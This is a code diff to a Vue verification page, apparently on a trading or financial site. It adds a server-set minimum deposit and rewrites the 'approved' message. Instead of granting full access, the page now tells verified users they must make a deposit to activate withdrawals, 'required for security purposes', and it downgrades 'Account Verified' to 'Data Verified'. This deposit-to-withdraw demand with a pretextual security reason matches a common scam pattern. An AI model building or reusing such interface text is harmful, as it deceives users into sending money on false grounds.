@@ -16,6 +16,7 @@ const form = ref({
     country: '',
     date_of_birth: '',
 });
+const minDeposit = ref(0);
 
 const countries = [
     'United States', 'United Kingdom', 'Russia', 'Germany', 'France', 
@@ -30,6 +31,7 @@ async function checkVerification() {
     try {
         const response = await HttpApi.get('verification');
         verification.value = response.data.verification;
+        minDeposit.value = response.data.min_deposit;
         hasCheckedVerification.value = true;
     } catch (error) {
         toast.error('Error checking verification status');
@@ -100,7 +102,7 @@ async function submitVerification() {
                                     <div>
                                         <p class="font-medium text-lg">
                                             {{ verification.verification_status === 'pending' ? 'Verification in Progress' :
-                                               verification.verification_status === 'approved' ? 'Account Verified' :
+                                               verification.verification_status === 'approved' ? 'Data Verified' :
                                                'Verification Rejected' }}
                                         </p>
                                         <p class="text-sm mt-1">
@@ -108,7 +110,17 @@ async function submitVerification() {
                                                 Your verification is being processed. Please wait for approval.
                                             </template>
                                             <template v-else-if="verification.verification_status === 'approved'">
-                                                Your account has been successfully verified. You now have full access to all features.
+                                                <div class="verification-status">
+                                                    <div class="success-message text-success">
+                                                        <i class="fas fa-check-circle me-2"></i>
+                                                        Your data has been successfully verified.
+                                                    </div>
+                                                    <div class="deposit-notice mt-3 bg-light rounded">
+                                                        <i class="fas fa-info-circle text-primary me-2"></i>
+                                                        <strong>Next step:</strong> To activate withdrawals, please make a deposit. 
+                                                        ${{ minDeposit }}. This is required for security purposes.
+                                                    </div>
+                                                </div>
                                             </template>
                                             <template v-else-if="verification.verification_status === 'rejected'">
                                                 Your verification was rejected. Please contact support for more information.
